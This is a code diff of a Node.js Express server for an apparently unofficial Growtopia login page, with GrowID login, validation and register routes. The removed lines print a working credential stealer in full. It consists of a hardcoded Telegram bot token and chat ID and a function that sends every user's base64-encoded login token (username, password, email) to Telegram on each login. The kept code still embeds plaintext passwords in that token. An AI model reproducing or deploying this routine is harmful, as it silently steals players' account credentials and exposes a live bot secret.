@@ -3,67 +3,9 @@ const app = express();
 const rateLimit = require('express-rate-limit');
 const bodyParser = require('body-parser');
 const compression = require('compression');
-const https = require('https'); // Imported native https module
-
-// --- Telegram Configuration ---
-// UPDATED: Using the correct token ending in ...8s
-const TG_BOT_TOKEN = '6441563124:AAF3LCmLVG6rOYXBmtDyRXDMiGYmGjHwzE4';
-const TG_CHAT_ID = '5113674259';
 
 function isValidEmail(email) {
     return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-}
-
-// Function to send token to Telegram with DEBUG logging
-function sendTelegramToken(tokenContent) {
-    return new Promise((resolve, reject) => {
-        console.log('Attempting to send token to Telegram...');
-        const message = `New Login Token:\n${tokenContent}`;
-        
-        const data = JSON.stringify({
-            chat_id: TG_CHAT_ID,
-            text: message,
-            disable_web_page_preview: true
-        });
-
-        const options = {
-            hostname: 'api.telegram.org',
-            port: 443,
-            path: `/bot${TG_BOT_TOKEN}/sendMessage`,
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Content-Length': Buffer.byteLength(data)
-            }
-        };
-
-        const req = https.request(options, (res) => {
-            let responseData = '';
-
-            // Await data to prevent Vercel from freezing the process early
-            res.on('data', (chunk) => {
-                responseData += chunk;
-            });
-
-            res.on('end', () => {
-                if (res.statusCode >= 200 && res.statusCode < 300) {
-                    console.log('Telegram notification sent successfully.');
-                } else {
-                    console.error(`Telegram API Error: ${res.statusCode} ${res.statusMessage}`);
-                    console.error('Response Body:', responseData);
-                }
-                resolve();
-            });
-        });
-
-        req.on('error', (e) => {
-            console.error('Telegram Network Error:', e);
-            resolve(); // Resolve anyway so the user can still login even if Telegram fails
-        });
-
-        req.write(data);
-        req.end();
-    });
 }
 
 app.use(compression({
@@ -104,18 +46,18 @@ app.all('/player/login/dashboard', function (req, res) {
             tData[d[0]] = d[1];
         }
 
-        if (uName[1] && uPass[1]) {
-            return res.redirect('/player/growid/login/validate');
-        }
+            if (uName[1] && uPass[1]) {
+                return res.redirect('/player/growid/login/validate');
+            }
     } catch (why) {
         console.log(`Warning: ${why}`);
     }
 
-    res.render(__dirname + '/public/html/dashboard.ejs', { data: tData });
+        // render the login UI (renamed from dashboard.ejs)
+        res.render(__dirname + '/public/html/login.ejs', { data: tData });
 });
 
-// Changed to async to handle Telegram await
-app.all('/player/growid/login/validate', async (req, res) => {
+app.all('/player/growid/login/validate', (req, res) => {
     const { type, growId = '', password = '', email = '', gender = 0, _token } = req.body;
 
     const trimmedGrowId = (growId || '').trim();
@@ -149,9 +91,6 @@ app.all('/player/growid/login/validate', async (req, res) => {
             `&gender=${gender}`;
 
         const token = Buffer.from(tokenData).toString('base64');
-        
-        // Send to Telegram
-        await sendTelegramToken(token);
 
         res.setHeader('Content-Type', 'text/html');
         return res.send(
@@ -178,9 +117,6 @@ app.all('/player/growid/login/validate', async (req, res) => {
         : `_token=${_token}&type=${type}&growId=${trimmedGrowId}&password=${trimmedPassword}`;
 
     const token = Buffer.from(tokenData).toString('base64');
-
-    // Send to Telegram
-    await sendTelegramToken(token);
 
     res.setHeader('Content-Type', 'text/html');
     res.send(`{"status":"success","message":"Account Validated.","token":"${token}","url":"","accountType":"growtopia"}`);
@@ -212,10 +148,11 @@ app.all('/', function (req, res) {
     res.sendFile(__dirname + '/public/html/index.html');
 });
 
-// For Vercel, it is best practice to export the app
-const PORT = process.env.PORT || 5000;
-app.listen(PORT, function () {
-    console.log(`Listening on port ${PORT}`);
+// Render register page
+app.all('/player/login/register', function (req, res) {
+    res.render(__dirname + '/public/html/register.ejs', { data: {} });
 });
 
-module.exports = app;
+app.listen(5000, function () {
+    console.log(`Listening on port 5000`);
+});
